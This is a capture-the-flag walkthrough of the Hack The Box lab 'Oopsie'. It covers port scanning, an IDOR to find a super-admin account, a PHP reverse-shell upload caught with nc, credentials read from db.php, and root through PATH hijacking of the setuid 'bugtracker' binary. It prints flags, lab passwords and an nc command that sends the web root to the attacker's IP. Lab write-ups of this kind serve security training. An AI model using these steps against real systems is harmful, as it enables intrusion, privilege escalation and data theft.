# Oopsie

## Ifconfig

<pre>
inet 10.10.14.69  netmask 255.255.254.0
inet6 fe80::d484:44d2:fd97:c02c
</pre>

## Nmap

> sudo nmap -sC -sV -A 10.10.10.28

<pre>
Nmap scan report for 10.10.10.28
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp   open     http          Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
3268/tcp filtered globalcatLDAP
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

## Test gobuster (Not pretty well)

> gobuster dir -x "php, css, js, html, txt, xml, json" -u "http://10.10.10.28" -w "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"

<pre>
find index.php, uploads/ to infer some certain files may onload
</pre>

## Use nikto finds cdn-cgi/login as a CGI directory

<pre>
username: admin
password: MEGACORP_4dm1n!!
</pre>

and then reach http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=**X**

- Use [script](./scripts/account_find.py) to find accounts **X**

<pre>
Found at id:    30
Account ID:     86575
Name:           super admin
Email:          superadmin@megacorp.com
</pre>

- upload [reverse shell php](https://github.com/pentestmonkey/php-reverse-shell) to server within super admin

- use nc -lvnp port to listen reverse shell file to connect
as http://10.10.10.28/uploads/[revshell.php](./scripts/revshell.php)

> whoami

<pre>
www-data
</pre>

> id
<pre>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>

- find user.txt in robert home

<pre>
user.txt
f2c74ee8db7983851ab2a96a44eb7981
</pre>

- get a better (interactive) bash use

> /usr/bin/script -qc /bin/bash /dev/null

or

> SHELL=/bin/bash /usr/bin/script -q /dev/null

## script help

<pre>
-a, --append                  append the output
-c, --command <command>       run command rather than interactive shell
-e, --return                  return exit code of the child process
-f, --flush                   run flush after each write
    --force                   use output file even when it is a link
-q, --quiet                   be quiet
-t[<file>], --timing[=<file>] output timing data to stderr or to FILE
-h, --help                    display this help
-V, --version                 display version
</pre>

## Get db.php content

> cat db.php

<pre>
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

username: robert
password: M3g4C0rpUs3r!
</pre>

- because ssh port 22 has open

> ssh robert@10.10.10.28

- command input "id"

<pre>
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
</pre>

=> group contains "bugtracker"


> find / -type f -group bugtracker 2> /dev/null

*(2> dev/null means discard unnecessary data message)*

<pre>
/usr/bin/bugtracker
</pre>

- Not important message

> file bugtracker

<pre>
bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
</pre>

- Check content of bugtracker

> strings bugtracker

<pre>
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
;*3$"
</pre>

- Establish a fake cat instead of root used

- Command in ~/tmp

> echo /bin/bash -P > cat 

or

> echo /bin/sh > cat

- Switch to local tmp file 'cat'

> chmod +x cat 

- Add PATH

> export PATH=/home/robert/tmp:$PATH

then exec bugtracker

any root privilege read file's bin root.txt

<pre>
root.txt
af13b0bee69f8a877c3faf667f7beacf
</pre>

## Report contents

- Report 1

<pre>
Binary package hint: ev-engine-lib
Version: 3.3.3-1
Reproduce:
When loading library in firmware it seems to be crashed
What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.
What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
</pre>

- Report 2

<pre>
If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.
ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
</pre>

- Report 3

<pre>
Hello,
When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...
Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)
I don't have such an issue or any slowdown when using other apps over the same SMB shares.
ProblemType: Bug
DistroRelease: Ubuntu 12.04
Package: filezilla 3.5.3-1ubuntu2
ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
Uname: Linux 3.2.0-25-generic x86_64
NonfreeKernelModules: nvidia
ApportVersion: 2.0.1-0ubuntu8
Architecture: amd64
Date: Sun Jul 1 19:06:31 2012
EcryptfsInUse: Yes
InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
ProcEnviron:
 TERM=xterm
 PATH=(custom, user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
ApportVersion: 2.13.3-0ubuntu1
Architecture: amd64
DistroRelease: Ubuntu 14.04
EcryptfsInUse: Yes
InstallationDate: Installed on 2013-02-23 (395 days ago)
InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
Package: gvfs
PackageArchitecture: amd64
ProcEnviron:
 LANGUAGE=fr_FR
 TERM=xterm
 PATH=(custom, no user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
Tags: trusty
Uname: Linux 3.13.0-19-generic x86_64
UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
UserGroups:
</pre>

## Goto the .config/filezilla/filezilla.xml in root dir

```
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

## Get the /var/www/html files

- in /var/www wrap html first

> tar -czf html.tar.gz html

*Server*

> cat html.tar.gz | nc 10.10.14.69 *port*

*Client*

> nc -lvnp *port* -q 1 > html.tar.gz < /dev/null
